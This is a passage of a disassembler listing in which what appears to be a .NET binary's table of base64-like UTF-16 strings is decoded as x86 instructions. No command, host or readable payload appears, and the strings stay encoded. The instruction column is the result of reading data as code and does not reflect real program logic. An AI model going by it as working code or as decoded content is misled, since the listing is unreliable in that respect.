  40b156:	00 56 00             	add    %dl,0x0(%esi)
  40b159:	44                   	inc    %esp
  40b15a:	00 31                	add    %dh,(%ecx)
  40b15c:	00 58 00             	add    %bl,0x0(%eax)
  40b15f:	49                   	dec    %ecx
  40b160:	00 70 00             	add    %dh,0x0(%eax)
  40b163:	6d                   	insl   (%dx),%es:(%edi)
  40b164:	00 7a 00             	add    %bh,0x0(%edx)
  40b167:	2f                   	das
  40b168:	00 6f 00             	add    %ch,0x0(%edi)
  40b16b:	50                   	push   %eax
  40b16c:	00 77 00             	add    %dh,0x0(%edi)
  40b16f:	47                   	inc    %edi
  40b170:	00 4b 00             	add    %cl,0x0(%ebx)
  40b173:	53                   	push   %ebx
  40b174:	00 69 00             	add    %ch,0x0(%ecx)
  40b177:	39 00                	cmp    %eax,(%eax)
  40b179:	62 00                	bound  %eax,(%eax)
  40b17b:	71 00                	jno    0x40b17d
  40b17d:	69 00 79 00 7a 00    	imul   $0x7a0079,(%eax),%eax
  40b183:	49                   	dec    %ecx
  40b184:	00 42 00             	add    %al,0x0(%edx)
  40b187:	2f                   	das
  40b188:	00 43 00             	add    %al,0x0(%ebx)
  40b18b:	70 00                	jo     0x40b18d
  40b18d:	39 00                	cmp    %eax,(%eax)
  40b18f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b190:	00 59 00             	add    %bl,0x0(%ecx)
  40b193:	41                   	inc    %ecx
  40b194:	00 32                	add    %dh,(%edx)
  40b196:	00 35 00 48 00 50    	add    %dh,0x50004800
  40b19c:	00 46 00             	add    %al,0x0(%esi)
  40b19f:	39 00                	cmp    %eax,(%eax)
  40b1a1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1a2:	00 50 00             	add    %dl,0x0(%eax)
  40b1a5:	68 00 6c 00 6d       	push   $0x6d006c00
  40b1aa:	00 6e 00             	add    %ch,0x0(%esi)
  40b1ad:	38 00                	cmp    %al,(%eax)
  40b1af:	44                   	inc    %esp
  40b1b0:	00 35 00 57 00 48    	add    %dh,0x48005700
  40b1b6:	00 45 00             	add    %al,0x0(%ebp)
  40b1b9:	55                   	push   %ebp
  40b1ba:	00 58 00             	add    %bl,0x0(%eax)
  40b1bd:	70 00                	jo     0x40b1bf
  40b1bf:	43                   	inc    %ebx
  40b1c0:	00 7a 00             	add    %bh,0x0(%edx)
  40b1c3:	71 00                	jno    0x40b1c5
  40b1c5:	77 00                	ja     0x40b1c7
  40b1c7:	32 00                	xor    (%eax),%al
  40b1c9:	5a                   	pop    %edx
  40b1ca:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  40b1ce:	00 67 00             	add    %ah,0x0(%edi)
  40b1d1:	7a 00                	jp     0x40b1d3
  40b1d3:	2b 00                	sub    (%eax),%eax
  40b1d5:	31 00                	xor    %eax,(%eax)
  40b1d7:	4e                   	dec    %esi
  40b1d8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b1db:	38 00                	cmp    %al,(%eax)
  40b1dd:	32 00                	xor    (%eax),%al
  40b1df:	61                   	popa
  40b1e0:	00 6e 00             	add    %ch,0x0(%esi)
  40b1e3:	43                   	inc    %ebx
  40b1e4:	00 78 00             	add    %bh,0x0(%eax)
  40b1e7:	33 00                	xor    (%eax),%eax
  40b1e9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1ea:	00 42 00             	add    %al,0x0(%edx)
  40b1ed:	51                   	push   %ecx
  40b1ee:	00 36                	add    %dh,(%esi)
  40b1f0:	00 55 00             	add    %dl,0x0(%ebp)
  40b1f3:	72 00                	jb     0x40b1f5
  40b1f5:	5a                   	pop    %edx
  40b1f6:	00 41 00             	add    %al,0x0(%ecx)
  40b1f9:	66 00 49 00          	data16 add %cl,0x0(%ecx)
  40b1fd:	32 00                	xor    (%eax),%al
  40b1ff:	52                   	push   %edx
  40b200:	00 46 00             	add    %al,0x0(%esi)
  40b203:	56                   	push   %esi
  40b204:	00 35 00 42 00 78    	add    %dh,0x78004200
  40b20a:	00 4f 00             	add    %cl,0x0(%edi)
  40b20d:	33 00                	xor    (%eax),%eax
  40b20f:	35 00 6e 00 75       	xor    $0x75006e00,%eax
  40b214:	00 42 00             	add    %al,0x0(%edx)
  40b217:	66 00 70 00          	data16 add %dh,0x0(%eax)
  40b21b:	61                   	popa
  40b21c:	00 48 00             	add    %cl,0x0(%eax)
  40b21f:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40b223:	4f                   	dec    %edi
  40b224:	00 61 00             	add    %ah,0x0(%ecx)
  40b227:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  40b22a:	00 4a 00             	add    %cl,0x0(%edx)
  40b22d:	4e                   	dec    %esi
  40b22e:	00 6b 00             	add    %ch,0x0(%ebx)
  40b231:	6a 00                	push   $0x0
  40b233:	6c                   	insb   (%dx),%es:(%edi)
  40b234:	00 37                	add    %dh,(%edi)
  40b236:	00 38                	add    %bh,(%eax)
  40b238:	00 51 00             	add    %dl,0x0(%ecx)
  40b23b:	78 00                	js     0x40b23d
  40b23d:	47                   	inc    %edi
  40b23e:	00 31                	add    %dh,(%ecx)
  40b240:	00 5a 00             	add    %bl,0x0(%edx)
  40b243:	6e                   	outsb  %ds:(%esi),(%dx)
  40b244:	00 42 00             	add    %al,0x0(%edx)
  40b247:	42                   	inc    %edx
  40b248:	00 30                	add    %dh,(%eax)
  40b24a:	00 46 00             	add    %al,0x0(%esi)
  40b24d:	48                   	dec    %eax
  40b24e:	00 41 00             	add    %al,0x0(%ecx)
  40b251:	2b 00                	sub    (%eax),%eax
  40b253:	58                   	pop    %eax
  40b254:	00 4f 00             	add    %cl,0x0(%edi)
  40b257:	71 00                	jno    0x40b259
  40b259:	5a                   	pop    %edx
  40b25a:	00 68 00             	add    %ch,0x0(%eax)
  40b25d:	63 00                	arpl   %eax,(%eax)
  40b25f:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40b263:	46                   	inc    %esi
  40b264:	00 59 00             	add    %bl,0x0(%ecx)
  40b267:	55                   	push   %ebp
  40b268:	00 47 00             	add    %al,0x0(%edi)
  40b26b:	48                   	dec    %eax
  40b26c:	00 41 00             	add    %al,0x0(%ecx)
  40b26f:	4a                   	dec    %edx
  40b270:	00 78 00             	add    %bh,0x0(%eax)
  40b273:	77 00                	ja     0x40b275
  40b275:	62 00                	bound  %eax,(%eax)
  40b277:	6d                   	insl   (%dx),%es:(%edi)
  40b278:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  40b27c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b27f:	7a 00                	jp     0x40b281
  40b281:	75 00                	jne    0x40b283
  40b283:	69 00 35 00 61 00    	imul   $0x610035,(%eax),%eax
  40b289:	46                   	inc    %esi
  40b28a:	00 49 00             	add    %cl,0x0(%ecx)
  40b28d:	47                   	inc    %edi
  40b28e:	00 4d 00             	add    %cl,0x0(%ebp)
  40b291:	2b 00                	sub    (%eax),%eax
  40b293:	46                   	inc    %esi
  40b294:	00 4d 00             	add    %cl,0x0(%ebp)
  40b297:	43                   	inc    %ebx
  40b298:	00 43 00             	add    %al,0x0(%ebx)
  40b29b:	46                   	inc    %esi
  40b29c:	00 53 00             	add    %dl,0x0(%ebx)
  40b29f:	70 00                	jo     0x40b2a1
  40b2a1:	50                   	push   %eax
  40b2a2:	00 4f 00             	add    %cl,0x0(%edi)
  40b2a5:	4e                   	dec    %esi
  40b2a6:	00 4f 00             	add    %cl,0x0(%edi)
  40b2a9:	4d                   	dec    %ebp
  40b2aa:	00 73 00             	add    %dh,0x0(%ebx)
  40b2ad:	68 00 38 00 59       	push   $0x59003800
  40b2b2:	00 6f 00             	add    %ch,0x0(%edi)
  40b2b5:	6c                   	insb   (%dx),%es:(%edi)
  40b2b6:	00 4e 00             	add    %cl,0x0(%esi)
  40b2b9:	2b 00                	sub    (%eax),%eax
  40b2bb:	4f                   	dec    %edi
  40b2bc:	00 67 00             	add    %ah,0x0(%edi)
  40b2bf:	51                   	push   %ecx
  40b2c0:	00 67 00             	add    %ah,0x0(%edi)
  40b2c3:	62 00                	bound  %eax,(%eax)
  40b2c5:	53                   	push   %ebx
  40b2c6:	00 37                	add    %dh,(%edi)
  40b2c8:	00 44 00 6b          	add    %al,0x6b(%eax,%eax,1)
  40b2cc:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40b2d0:	00 38                	add    %bh,(%eax)
  40b2d2:	00 78 00             	add    %bh,0x0(%eax)
  40b2d5:	77 00                	ja     0x40b2d7
  40b2d7:	47                   	inc    %edi
  40b2d8:	00 30                	add    %dh,(%eax)
  40b2da:	00 4a 00             	add    %cl,0x0(%edx)
  40b2dd:	47                   	inc    %edi
  40b2de:	00 45 00             	add    %al,0x0(%ebp)
  40b2e1:	59                   	pop    %ecx
  40b2e2:	00 45 00             	add    %al,0x0(%ebp)
  40b2e5:	66 00 68 00          	data16 add %ch,0x0(%eax)
  40b2e9:	6a 00                	push   $0x0
  40b2eb:	69 00 2f 00 73 00    	imul   $0x73002f,(%eax),%eax
  40b2f1:	6c                   	insb   (%dx),%es:(%edi)
  40b2f2:	00 77 00             	add    %dh,0x0(%edi)
  40b2f5:	4e                   	dec    %esi
  40b2f6:	00 67 00             	add    %ah,0x0(%edi)
  40b2f9:	33 00                	xor    (%eax),%eax
  40b2fb:	4e                   	dec    %esi
  40b2fc:	00 4e 00             	add    %cl,0x0(%esi)
  40b2ff:	6e                   	outsb  %ds:(%esi),(%dx)
  40b300:	00 45 00             	add    %al,0x0(%ebp)
  40b303:	63 00                	arpl   %eax,(%eax)
  40b305:	75 00                	jne    0x40b307
  40b307:	44                   	inc    %esp
  40b308:	00 71 00             	add    %dh,0x0(%ecx)
  40b30b:	36 00 39             	add    %bh,%ss:(%ecx)
  40b30e:	00 39                	add    %bh,(%ecx)
  40b310:	00 6d 00             	add    %ch,0x0(%ebp)
  40b313:	6c                   	insb   (%dx),%es:(%edi)
  40b314:	00 76 00             	add    %dh,0x0(%esi)
  40b317:	2b 00                	sub    (%eax),%eax
  40b319:	2f                   	das
  40b31a:	00 38                	add    %bh,(%eax)
  40b31c:	00 6e 00             	add    %ch,0x0(%esi)
  40b31f:	65 00 2f             	add    %ch,%gs:(%edi)
  40b322:	00 4c 00 36          	add    %cl,0x36(%eax,%eax,1)
  40b326:	00 58 00             	add    %bl,0x0(%eax)
  40b329:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  40b32d:	48                   	dec    %eax
  40b32e:	00 42 00             	add    %al,0x0(%edx)
  40b331:	66 00 58 00          	data16 add %bl,0x0(%eax)
  40b335:	6f                   	outsl  %ds:(%esi),(%dx)
  40b336:	00 63 00             	add    %ah,0x0(%ebx)
  40b339:	67 00 50 00          	add    %dl,0x0(%bx,%si)
  40b33d:	39 00                	cmp    %eax,(%eax)
  40b33f:	39 00                	cmp    %eax,(%eax)
  40b341:	76 00                	jbe    0x40b343
  40b343:	52                   	push   %edx
  40b344:	00 66 00             	add    %ah,0x0(%esi)
  40b347:	62 00                	bound  %eax,(%eax)
  40b349:	59                   	pop    %ecx
  40b34a:	00 2f                	add    %ch,(%edi)
  40b34c:	00 62 00             	add    %ah,0x0(%edx)
  40b34f:	74 00                	je     0x40b351
  40b351:	6d                   	insl   (%dx),%es:(%edi)
  40b352:	00 2f                	add    %ch,(%edi)
  40b354:	00 68 00             	add    %ch,0x0(%eax)
  40b357:	6e                   	outsb  %ds:(%esi),(%dx)
  40b358:	00 47 00             	add    %al,0x0(%edi)
  40b35b:	68 00 79 00 78       	push   $0x78007900
  40b360:	00 65 00             	add    %ah,0x0(%ebp)
  40b363:	63 00                	arpl   %eax,(%eax)
  40b365:	6b 00 48             	imul   $0x48,(%eax),%eax
  40b368:	00 55 00             	add    %dl,0x0(%ebp)
  40b36b:	62 00                	bound  %eax,(%eax)
  40b36d:	2b 00                	sub    (%eax),%eax
  40b36f:	45                   	inc    %ebp
  40b370:	00 32                	add    %dh,(%edx)
  40b372:	00 6a 00             	add    %ch,0x0(%edx)
  40b375:	35 00 66 00 49       	xor    $0x49006600,%eax
  40b37a:	00 4f 00             	add    %cl,0x0(%edi)
  40b37d:	50                   	push   %eax
  40b37e:	00 48 00             	add    %cl,0x0(%eax)
  40b381:	47                   	inc    %edi
  40b382:	00 52 00             	add    %dl,0x0(%edx)
  40b385:	57                   	push   %edi
  40b386:	00 73 00             	add    %dh,0x0(%ebx)
  40b389:	75 00                	jne    0x40b38b
  40b38b:	68 00 69 00 42       	push   $0x42006900
  40b390:	00 55 00             	add    %dl,0x0(%ebp)
  40b393:	6f                   	outsl  %ds:(%esi),(%dx)
  40b394:	00 37                	add    %dh,(%edi)
  40b396:	00 33                	add    %dh,(%ebx)
  40b398:	00 57 00             	add    %dl,0x0(%edi)
  40b39b:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40b39f:	64 00 7a 00          	add    %bh,%fs:0x0(%edx)
  40b3a3:	76 00                	jbe    0x40b3a5
  40b3a5:	61                   	popa
  40b3a6:	00 45 00             	add    %al,0x0(%ebp)
  40b3a9:	78 00                	js     0x40b3ab
  40b3ab:	75 00                	jne    0x40b3ad
  40b3ad:	56                   	push   %esi
  40b3ae:	00 6e 00             	add    %ch,0x0(%esi)
  40b3b1:	44                   	inc    %esp
  40b3b2:	00 54 00 53          	add    %dl,0x53(%eax,%eax,1)
  40b3b6:	00 67 00             	add    %ah,0x0(%edi)
  40b3b9:	4d                   	dec    %ebp
  40b3ba:	00 4b 00             	add    %cl,0x0(%ebx)
  40b3bd:	73 00                	jae    0x40b3bf
  40b3bf:	50                   	push   %eax
  40b3c0:	00 69 00             	add    %ch,0x0(%ecx)
  40b3c3:	44                   	inc    %esp
  40b3c4:	00 32                	add    %dh,(%edx)
  40b3c6:	00 33                	add    %dh,(%ebx)
  40b3c8:	00 46 00             	add    %al,0x0(%esi)
  40b3cb:	78 00                	js     0x40b3cd
  40b3cd:	41                   	inc    %ecx
  40b3ce:	00 64 00 2f          	add    %ah,0x2f(%eax,%eax,1)
  40b3d2:	00 79 00             	add    %bh,0x0(%ecx)
  40b3d5:	6b 00 74             	imul   $0x74,(%eax),%eax
  40b3d8:	00 53 00             	add    %dl,0x0(%ebx)
  40b3db:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3dc:	00 56 00             	add    %dl,0x0(%esi)
  40b3df:	76 00                	jbe    0x40b3e1
  40b3e1:	48                   	dec    %eax
  40b3e2:	00 49 00             	add    %cl,0x0(%ecx)
  40b3e5:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40b3e9:	39 00                	cmp    %eax,(%eax)
  40b3eb:	69 00 4f 00 61 00    	imul   $0x61004f,(%eax),%eax
  40b3f1:	39 00                	cmp    %eax,(%eax)
  40b3f3:	52                   	push   %edx
  40b3f4:	00 69 00             	add    %ch,0x0(%ecx)
  40b3f7:	6a 00                	push   $0x0
  40b3f9:	41                   	inc    %ecx
  40b3fa:	00 52 00             	add    %dl,0x0(%edx)
  40b3fd:	31 00                	xor    %eax,(%eax)
  40b3ff:	64 00 59 00          	add    %bl,%fs:0x0(%ecx)
  40b403:	36 00 62 00          	add    %ah,%ss:0x0(%edx)
  40b407:	68 00 4e 00 32       	push   $0x32004e00
  40b40c:	00 6f 00             	add    %ch,0x0(%edi)
  40b40f:	4e                   	dec    %esi
  40b410:	00 36                	add    %dh,(%esi)
  40b412:	00 41 00             	add    %al,0x0(%ecx)
  40b415:	35 00 76 00 4f       	xor    $0x4f007600,%eax
  40b41a:	00 32                	add    %dh,(%edx)
  40b41c:	00 77 00             	add    %dh,0x0(%edi)
  40b41f:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  40b423:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40b427:	4f                   	dec    %edi
  40b428:	00 65 00             	add    %ah,0x0(%ebp)
  40b42b:	35 00 34 00 5a       	xor    $0x5a003400,%eax
  40b430:	00 50 00             	add    %dl,0x0(%eax)
  40b433:	37                   	aaa
  40b434:	00 53 00             	add    %dl,0x0(%ebx)
  40b437:	35 00 66 00 6e       	xor    $0x6e006600,%eax
  40b43c:	00 68 00             	add    %ch,0x0(%eax)
  40b43f:	37                   	aaa
  40b440:	00 71 00             	add    %dh,0x0(%ecx)
  40b443:	4c                   	dec    %esp
  40b444:	00 53 00             	add    %dl,0x0(%ebx)
  40b447:	35 00 70 00 54       	xor    $0x54007000,%eax
  40b44c:	00 63 00             	add    %ah,0x0(%ebx)
  40b44f:	70 00                	jo     0x40b451
  40b451:	4e                   	dec    %esi
  40b452:	00 35 00 2f 00 56    	add    %dh,0x56002f00
  40b458:	00 35 00 69 00 57    	add    %dh,0x57006900
  40b45e:	00 47 00             	add    %al,0x0(%edi)
  40b461:	70 00                	jo     0x40b463
  40b463:	52                   	push   %edx
  40b464:	00 52 00             	add    %dl,0x0(%edx)
  40b467:	63 00                	arpl   %eax,(%eax)
  40b469:	59                   	pop    %ecx
  40b46a:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  40b46e:	00 4a 00             	add    %cl,0x0(%edx)
  40b471:	69 00 49 00 51 00    	imul   $0x510049,(%eax),%eax
  40b477:	65 00 6c 00 70       	add    %ch,%gs:0x70(%eax,%eax,1)
  40b47c:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  40b480:	00 6d 00             	add    %ch,0x0(%ebp)
  40b483:	50                   	push   %eax
  40b484:	00 31                	add    %dh,(%ecx)
  40b486:	00 78 00             	add    %bh,0x0(%eax)
  40b489:	67 00 4c 00          	add    %cl,0x0(%si)
  40b48d:	52                   	push   %edx
  40b48e:	00 31                	add    %dh,(%ecx)
  40b490:	00 59 00             	add    %bl,0x0(%ecx)
  40b493:	76 00                	jbe    0x40b495
  40b495:	44                   	inc    %esp
  40b496:	00 48 00             	add    %cl,0x0(%eax)
  40b499:	59                   	pop    %ecx
  40b49a:	00 48 00             	add    %cl,0x0(%eax)
  40b49d:	76 00                	jbe    0x40b49f
  40b49f:	35 00 67 00 30       	xor    $0x30006700,%eax
  40b4a4:	00 56 00             	add    %dl,0x0(%esi)
  40b4a7:	31 00                	xor    %eax,(%eax)
  40b4a9:	4d                   	dec    %ebp
  40b4aa:	00 51 00             	add    %dl,0x0(%ecx)
  40b4ad:	52                   	push   %edx
  40b4ae:	00 58 00             	add    %bl,0x0(%eax)
  40b4b1:	49                   	dec    %ecx
  40b4b2:	00 35 00 6b 00 6c    	add    %dh,0x6c006b00
  40b4b8:	00 4a 00             	add    %cl,0x0(%edx)
  40b4bb:	30 00                	xor    %al,(%eax)
  40b4bd:	4b                   	dec    %ebx
  40b4be:	00 46 00             	add    %al,0x0(%esi)
  40b4c1:	61                   	popa
  40b4c2:	00 47 00             	add    %al,0x0(%edi)
  40b4c5:	41                   	inc    %ecx
  40b4c6:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40b4ca:	00 2f                	add    %ch,(%edi)
  40b4cc:	00 41 00             	add    %al,0x0(%ecx)
  40b4cf:	41                   	inc    %ecx
  40b4d0:	00 32                	add    %dh,(%edx)
  40b4d2:	00 76 00             	add    %dh,0x0(%esi)
  40b4d5:	4d                   	dec    %ebp
  40b4d6:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  40b4da:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40b4de:	00 6e 00             	add    %ch,0x0(%esi)
  40b4e1:	30 00                	xor    %al,(%eax)
  40b4e3:	51                   	push   %ecx
  40b4e4:	00 72 00             	add    %dh,0x0(%edx)
  40b4e7:	33 00                	xor    (%eax),%eax
  40b4e9:	48                   	dec    %eax
  40b4ea:	00 7a 00             	add    %bh,0x0(%edx)
  40b4ed:	4d                   	dec    %ebp
  40b4ee:	00 4e 00             	add    %cl,0x0(%esi)
  40b4f1:	67 00 55 00          	add    %dl,0x0(%di)
  40b4f5:	52                   	push   %edx
  40b4f6:	00 32                	add    %dh,(%edx)
  40b4f8:	00 47 00             	add    %al,0x0(%edi)
  40b4fb:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4fc:	00 79 00             	add    %bh,0x0(%ecx)
  40b4ff:	57                   	push   %edi
  40b500:	00 37                	add    %dh,(%edi)
  40b502:	00 35 00 47 00 6b    	add    %dh,0x6b004700
  40b508:	00 32                	add    %dh,(%edx)
  40b50a:	00 55 00             	add    %dl,0x0(%ebp)
  40b50d:	74 00                	je     0x40b50f
  40b50f:	41                   	inc    %ecx
  40b510:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40b516:	80 b1 6b 00 57 00 43 	xorb   $0x43,0x57006b(%ecx)
  40b51d:	00 71 00             	add    %dh,0x0(%ecx)
  40b520:	73 00                	jae    0x40b522
  40b522:	55                   	push   %ebp
  40b523:	00 6e 00             	add    %ch,0x0(%esi)
  40b526:	56                   	push   %esi
  40b527:	00 76 00             	add    %dh,0x0(%esi)
  40b52a:	52                   	push   %edx
  40b52b:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40b52f:	00 70 00             	add    %dh,0x0(%eax)
  40b532:	52                   	push   %edx
  40b533:	00 31                	add    %dh,(%ecx)
  40b535:	00 4a 00             	add    %cl,0x0(%edx)
  40b538:	4b                   	dec    %ebx
  40b539:	00 43 00             	add    %al,0x0(%ebx)
  40b53c:	57                   	push   %edi
  40b53d:	00 52 00             	add    %dl,0x0(%edx)
  40b540:	57                   	push   %edi
  40b541:	00 66 00             	add    %ah,0x0(%esi)
  40b544:	4d                   	dec    %ebp
  40b545:	00 56 00             	add    %dl,0x0(%esi)
  40b548:	73 00                	jae    0x40b54a
  40b54a:	69 00 75 00 58 00    	imul   $0x580075,(%eax),%eax
  40b550:	46                   	inc    %esi
  40b551:	00 67 00             	add    %ah,0x0(%edi)
  40b554:	6d                   	insl   (%dx),%es:(%edi)
  40b555:	00 55 00             	add    %dl,0x0(%ebp)
  40b558:	35 00 63 00 35       	xor    $0x35006300,%eax
  40b55d:	00 68 00             	add    %ch,0x0(%eax)
  40b560:	6d                   	insl   (%dx),%es:(%edi)
  40b561:	00 67 00             	add    %ah,0x0(%edi)
  40b564:	38 00                	cmp    %al,(%eax)
  40b566:	33 00                	xor    (%eax),%eax
  40b568:	56                   	push   %esi
  40b569:	00 6a 00             	add    %ch,0x0(%edx)
  40b56c:	75 00                	jne    0x40b56e
  40b56e:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40b572:	52                   	push   %edx
  40b573:	00 58 00             	add    %bl,0x0(%eax)
  40b576:	38 00                	cmp    %al,(%eax)
  40b578:	4a                   	dec    %edx
  40b579:	00 36                	add    %dh,(%esi)
  40b57b:	00 7a 00             	add    %bh,0x0(%edx)
  40b57e:	37                   	aaa
  40b57f:	00 52 00             	add    %dl,0x0(%edx)
  40b582:	4a                   	dec    %edx
  40b583:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b586:	6a 00                	push   $0x0
  40b588:	52                   	push   %edx
  40b589:	00 6a 00             	add    %ch,0x0(%edx)
  40b58c:	4b                   	dec    %ebx
  40b58d:	00 5a 00             	add    %bl,0x0(%edx)
  40b590:	59                   	pop    %ecx
  40b591:	00 43 00             	add    %al,0x0(%ebx)
  40b594:	30 00                	xor    %al,(%eax)
  40b596:	61                   	popa
  40b597:	00 30                	add    %dh,(%eax)
  40b599:	00 2b                	add    %ch,(%ebx)
  40b59b:	00 4d 00             	add    %cl,0x0(%ebp)
  40b59e:	35 00 66 00 48       	xor    $0x48006600,%eax
  40b5a3:	00 52 00             	add    %dl,0x0(%edx)
  40b5a6:	5a                   	pop    %edx
  40b5a7:	00 33                	add    %dh,(%ebx)
  40b5a9:	00 30                	add    %dh,(%eax)
  40b5ab:	00 32                	add    %dh,(%edx)
  40b5ad:	00 6a 00             	add    %ch,0x0(%edx)
  40b5b0:	32 00                	xor    (%eax),%al
  40b5b2:	62 00                	bound  %eax,(%eax)
  40b5b4:	49                   	dec    %ecx
  40b5b5:	00 50 00             	add    %dl,0x0(%eax)
  40b5b8:	4f                   	dec    %edi
  40b5b9:	00 45 00             	add    %al,0x0(%ebp)
  40b5bc:	37                   	aaa
  40b5bd:	00 49 00             	add    %cl,0x0(%ecx)
  40b5c0:	54                   	push   %esp
  40b5c1:	00 67 00             	add    %ah,0x0(%edi)
  40b5c4:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b5c9:	80 b1 39 00 4b 00 68 	xorb   $0x68,0x4b0039(%ecx)
  40b5d0:	00 56 00             	add    %dl,0x0(%esi)
  40b5d3:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40b5d7:	57                   	push   %edi
  40b5d8:	00 6b 00             	add    %ch,0x0(%ebx)
  40b5db:	2b 00                	sub    (%eax),%eax
  40b5dd:	47                   	inc    %edi
  40b5de:	00 6c 00 35          	add    %ch,0x35(%eax,%eax,1)
  40b5e2:	00 47 00             	add    %al,0x0(%edi)
  40b5e5:	30 00                	xor    %al,(%eax)
  40b5e7:	38 00                	cmp    %al,(%eax)
  40b5e9:	65 00 7a 00          	add    %bh,%gs:0x0(%edx)
  40b5ed:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40b5f1:	52                   	push   %edx
  40b5f2:	00 65 00             	add    %ah,0x0(%ebp)
  40b5f5:	49                   	dec    %ecx
  40b5f6:	00 58 00             	add    %bl,0x0(%eax)
  40b5f9:	37                   	aaa
  40b5fa:	00 2b                	add    %ch,(%ebx)
  40b5fc:	00 42 00             	add    %al,0x0(%edx)
  40b5ff:	76 00                	jbe    0x40b601
  40b601:	59                   	pop    %ecx
  40b602:	00 65 00             	add    %ah,0x0(%ebp)
  40b605:	4d                   	dec    %ebp
  40b606:	00 39                	add    %bh,(%ecx)
  40b608:	00 7a 00             	add    %bh,0x0(%edx)
  40b60b:	2b 00                	sub    (%eax),%eax
  40b60d:	32 00                	xor    (%eax),%al
  40b60f:	67 00 44 00          	add    %al,0x0(%si)
  40b613:	6f                   	outsl  %ds:(%esi),(%dx)
  40b614:	00 73 00             	add    %dh,0x0(%ebx)
  40b617:	53                   	push   %ebx
  40b618:	00 4d 00             	add    %cl,0x0(%ebp)
  40b61b:	4a                   	dec    %edx
  40b61c:	00 62 00             	add    %ah,0x0(%edx)
  40b61f:	39 00                	cmp    %eax,(%eax)
  40b621:	4d                   	dec    %ebp
  40b622:	00 4e 00             	add    %cl,0x0(%esi)
  40b625:	39 00                	cmp    %eax,(%eax)
  40b627:	66 00 47 00          	data16 add %al,0x0(%edi)
  40b62b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b62c:	00 66 00             	add    %ah,0x0(%esi)
  40b62f:	62 00                	bound  %eax,(%eax)
  40b631:	62 00                	bound  %eax,(%eax)
  40b633:	58                   	pop    %eax
  40b634:	00 39                	add    %bh,(%ecx)
  40b636:	00 42 00             	add    %al,0x0(%edx)
  40b639:	4e                   	dec    %esi
  40b63a:	00 2f                	add    %ch,(%edi)
  40b63c:	00 77 00             	add    %dh,0x0(%edi)
  40b63f:	4b                   	dec    %ebx
  40b640:	00 78 00             	add    %bh,0x0(%eax)
  40b643:	55                   	push   %ebp
  40b644:	00 43 00             	add    %al,0x0(%ebx)
  40b647:	6f                   	outsl  %ds:(%esi),(%dx)
  40b648:	00 33                	add    %dh,(%ebx)
  40b64a:	00 67 00             	add    %ah,0x0(%edi)
  40b64d:	58                   	pop    %eax
  40b64e:	00 68 00             	add    %ch,0x0(%eax)
  40b651:	45                   	inc    %ebp
  40b652:	00 30                	add    %dh,(%eax)
  40b654:	00 72 00             	add    %dh,0x0(%edx)
  40b657:	6d                   	insl   (%dx),%es:(%edi)
  40b658:	00 47 00             	add    %al,0x0(%edi)
  40b65b:	2b 00                	sub    (%eax),%eax
  40b65d:	32 00                	xor    (%eax),%al
  40b65f:	6c                   	insb   (%dx),%es:(%edi)
  40b660:	00 33                	add    %dh,(%ebx)
  40b662:	00 67 00             	add    %ah,0x0(%edi)
  40b665:	44                   	inc    %esp
  40b666:	00 58 00             	add    %bl,0x0(%eax)
  40b669:	69 00 43 00 33 00    	imul   $0x330043,(%eax),%eax
  40b66f:	50                   	push   %eax
  40b670:	00 2f                	add    %ch,(%edi)
  40b672:	00 4b 00             	add    %cl,0x0(%ebx)
  40b675:	67 00 3d             	add    %bh,(%di)
  40b678:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40b67e:	32 00                	xor    (%eax),%al
  40b680:	57                   	push   %edi
  40b681:	00 55 00             	add    %dl,0x0(%ebp)
  40b684:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b688:	6a 00                	push   $0x0
  40b68a:	71 00                	jno    0x40b68c
  40b68c:	6b 00 71             	imul   $0x71,(%eax),%eax
  40b68f:	00 77 00             	add    %dh,0x0(%edi)
  40b692:	68 00 6d 00 33       	push   $0x33006d00
  40b697:	00 52 00             	add    %dl,0x0(%edx)
  40b69a:	33 00                	xor    (%eax),%eax
  40b69c:	43                   	inc    %ebx
  40b69d:	00 4a 00             	add    %cl,0x0(%edx)
  40b6a0:	38 00                	cmp    %al,(%eax)
  40b6a2:	74 00                	je     0x40b6a4
  40b6a4:	31 00                	xor    %eax,(%eax)
  40b6a6:	68 00 33 00 62       	push   $0x62003300
  40b6ab:	00 37                	add    %dh,(%edi)
  40b6ad:	00 53 00             	add    %dl,0x0(%ebx)
  40b6b0:	47                   	inc    %edi
  40b6b1:	00 4b 00             	add    %cl,0x0(%ebx)
  40b6b4:	4e                   	dec    %esi
  40b6b5:	00 43 00             	add    %al,0x0(%ebx)
  40b6b8:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  40b6bc:	75 00                	jne    0x40b6be
  40b6be:	70 00                	jo     0x40b6c0
  40b6c0:	43                   	inc    %ebx
  40b6c1:	00 45 00             	add    %al,0x0(%ebp)
  40b6c4:	61                   	popa
